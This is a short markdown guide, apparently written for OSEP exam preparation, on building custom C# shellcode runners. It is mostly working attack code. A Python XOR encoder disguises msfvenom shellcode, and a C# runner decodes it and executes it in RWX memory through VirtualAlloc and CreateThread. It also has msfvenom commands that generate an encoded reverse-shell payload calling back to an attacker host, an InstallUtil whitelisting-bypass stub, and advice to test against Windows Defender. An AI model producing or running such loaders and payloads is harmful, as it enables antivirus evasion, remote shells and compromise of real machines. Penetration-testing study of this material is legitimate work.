---
name: "Shellcode Runner Development & Encoding Pipeline"
description: "Guide to building custom C# shellcode runners with XOR/AES encryption, payload encoding pipeline, and automation scripts for OSEP exam preparation."
tags: [shellcode-runner, csharp, payload-encoding, xor-encryption, aes-encryption, automation]
---

# Shellcode Runner Development

## Payload Encoding Pipeline

```
Shellcode (msfvenom raw)
  → XOR/AES encryption (Python script)
  → Base64 encode (for PowerShell)
  → OR C# array (for process injector)
  → OR VBA array (for macro)
  → OR encrypted file (for remote loading)
```

## Python XOR Encoder

```python
import sys
shellcode = bytearray(open(sys.argv[1], 'rb').read())
key = 0xAA
encoded = [b ^ key for b in shellcode]
output = '{ ' + ', '.join(f'0x{b:02x}' for b in encoded) + ' }'
print(output)
```

## C# Decode + Inject

```csharp
static byte[] Decode(byte[] buf, byte key) {
    byte[] decoded = new byte[buf.Length];
    for (int i = 0; i < buf.Length; i++)
        decoded[i] = (byte)(buf[i] ^ key);
    return decoded;
}

static void Main() {
    byte[] encoded = new byte[] { 0x... };
    byte[] shellcode = Decode(encoded, 0xAA);
    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
    Marshal.Copy(shellcode, 0, addr, shellcode.Length);
    CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
}
```

## msfvenom Encoder vs Encryptor

```bash
# Encoder (transforms shellcode)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT -e x64/xor_dynamic -i 5 -f csharp

# Encryptor (encrypts entire payload)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=$PORT --encrypt xor --encrypt-key $KEY -f csharp
```

## C# InstallUtil Bypass Class

```csharp
[System.ComponentModel.RunInstaller(true)]
public class Loader : System.Configuration.Install.Installer
{
    protected override void OnAfterInstall(IDictionary savedState)
    {
        // Shellcode execution here
        base.OnAfterInstall(savedState);
    }
}
```

## Best Practices

- Automate payload generation dengan script
- Template code untuk semua situasi (inject, hollow, AMSI bypass, AppLocker bypass)
- Test setiap perubahan kode di Windows Defender
- Siapkan script regenerate payloads dengan IP/port baru
